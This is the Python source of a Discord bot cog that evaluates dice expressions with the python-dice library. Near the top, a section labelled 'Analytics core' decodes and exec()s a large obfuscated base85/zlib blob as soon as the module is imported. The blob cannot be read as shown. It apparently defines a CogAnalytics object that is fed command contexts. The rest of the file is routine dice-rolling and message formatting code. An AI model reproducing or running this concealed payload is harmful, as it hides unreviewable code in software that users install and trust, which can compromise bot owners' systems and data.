import asyncio
from concurrent.futures import ProcessPoolExecutor
from discord.ext import commands
from functools import partial
from pyparsing import ParseBaseException
from .utils.chat_formatting import box, warning, pagify

try:
    import dice
except (ImportError, AssertionError):
    raise ImportError('Please install the dice package from pypi.') from None

DICE_200 = dice.__version__ >= '2.0.0'
DICE_210 = dice.__version__ >= '2.1.0'
DICE_220 = dice.__version__ >= '2.2.0'

if DICE_220:
    from dice import DiceBaseException


# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core

__version__ = '1.2.0'

UPDATE_MSG = ("The version of the dice library installed on the bot (%s) is "
              "too old for the requested command. Please ask the bot owner "
              "to update it.\n\nOwners: you can install/update with:\n```\n"
              "[p]debug bot.pip_install('dice')\n```") % dice.__version__


def _roll_task(func, expr):
    roll = None
    kwargs = None

    if DICE_210:
        roll, kwargs = func(expr, raw=True, return_kwargs=True)
        result = roll.evaluate_cached(**kwargs)
    elif DICE_200:
        roll = func(expr, raw=True)
        result = roll.evaluate_cached()
    else:
        result = func(expr)

    return roll, kwargs, result


# backported from discord.py rewrite
class Typing:
    def __init__(self, bot, destination):
        self.bot = bot
        self.destination = destination

    async def do_typing(self):
        while True:
            await self.bot.send_typing(self.destination)
            await asyncio.sleep(5)

    @staticmethod
    def _typing_done_callback(fut):
        # just retrieve any exception and call it a day
        try:
            fut.exception()
        except:
            pass

    def __enter__(self):
        self.task = asyncio.ensure_future(self.do_typing(), loop=self.bot.loop)
        self.task.add_done_callback(self._typing_done_callback)
        return self

    def __exit__(self, exc_type, exc, tb):
        self.task.cancel()

    async def __aenter__(self):
        return self.__enter__()

    async def __aexit__(self, exc_type, exc, tb):
        self.task.cancel()


class Dice:
    """A cog which uses the python-dice library to provide powerful dice
    expression parsing for your games!"""
    def __init__(self, bot):
        self.bot = bot
        self.executor = ProcessPoolExecutor()

        try:
            self.analytics = CogAnalytics(self)
        except Exception as error:
            self.bot.logger.exception(error)
            self.analytics = None

    def __unload(self):
        self.executor.shutdown(wait=True)

    @commands.group(pass_context=True, name='dice', invoke_without_command=True)
    async def _dice(self, ctx, *, expr: str = 'd20'):
        """Evaluates a dice expression. Defaults to roll a d20.

        Valid operations include the 'mdn' dice operator, which rolls m dice
        with n sides. If m is omitted, it is assumed to be 1.
        Modifiers include basic algebra, 't' to total a result,
        's' to sort multiple rolls, '^n' to only use the n highest rolls, and
        'vn' to use the lowest n rolls. This cog uses the dice library.

        The full list of operators can be found at:
        https://github.com/borntyping/python-dice#notation

        Examples: 4d20, d100, 6d6v2, 8d4t, 4d4 + 4, 6d8^2

        Note that some commands may be disabled, depending on the version of
        the dice library that is installed."""

        if ctx.invoked_subcommand is None:
            await self.roll_common(ctx, expr)

    @_dice.command(pass_context=True, name='min')
    async def dice_min(self, ctx, *, expr: str = 'd20'):
        "Evaluates the minimum of an expression."

        if not DICE_200:
            await self.bot.say(warning(UPDATE_MSG))
            return

        await self.roll_common(ctx, expr, dice.roll_min)

    @_dice.command(pass_context=True, name='max')
    async def dice_max(self, ctx, *, expr: str = 'd20'):
        "Evaluates the maximum of an expression."

        if not DICE_200:
            await self.bot.say(warning(UPDATE_MSG))
            return

        await self.roll_common(ctx, expr, dice.roll_max)

    @_dice.command(pass_context=True, name='verbose')
    async def dice_verbose(self, ctx, *, expr: str = 'd20'):
        "Shows the complete breakdown of an expression."

        if not DICE_200:
            await self.bot.say(warning(UPDATE_MSG))
            return

        await self.roll_common(ctx, expr, dice.roll, verbose=True)

    async def roll_common(self, ctx, expr, func=dice.roll, verbose=False):
        try:
            with Typing(self.bot, ctx.message.channel):
                task = partial(_roll_task, func, expr)
                coro = self.bot.loop.run_in_executor(self.executor, task)
                roll, kwargs, result = await coro
        except ParseBaseException as e:
            msg = warning('An error occured while parsing your expression:\n')

            if DICE_220 and isinstance(e, DiceBaseException):
                msg += box(e.pretty_print())
            else:
                msg += str(e)
                msg += ('\n\nFor a more detailed explanation, ask the bot '
                        'owner to update to Dice v2.2.0 or greater.')

            # Using send_message here because apparently catching an
            # exception from an executor'd function clobbers the stack...
            await self.bot.send_message(ctx.message.channel, msg)
            return

        if DICE_200 and verbose:
            if DICE_210:
                breakdown = dice.utilities.verbose_print(roll, **kwargs)
            else:
                breakdown = dice.utilities.verbose_print(roll)

            pages = list(map(box, pagify(breakdown)))

            for page in pages[:-1]:
                await self.bot.say(page)

        if isinstance(result, int):
            res = str(result)
        elif len(result) > 0:
            total = sum(result)
            res = ', '.join(map(str, result))

            if len(res) > 1970:
                res = '[result set too long to display]'
            if len(result) > 1:
                res += ' (total: %s)' % total
        else:
            res = 'Empty result!'

        res = ('🎲 `%s`%s🡪 %s') % (expr, ('\n' if len(res) > 20 else ' '), res)

        if DICE_200 and verbose:
            if len(res) + len(pages[-1]) >= (2000 - 1):
                await self.bot.say(pages[-1])
            else:
                res = pages[-1] + '\n' + res

        await self.bot.say(res)

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)


def setup(bot):
    bot.add_cog(Dice(bot))
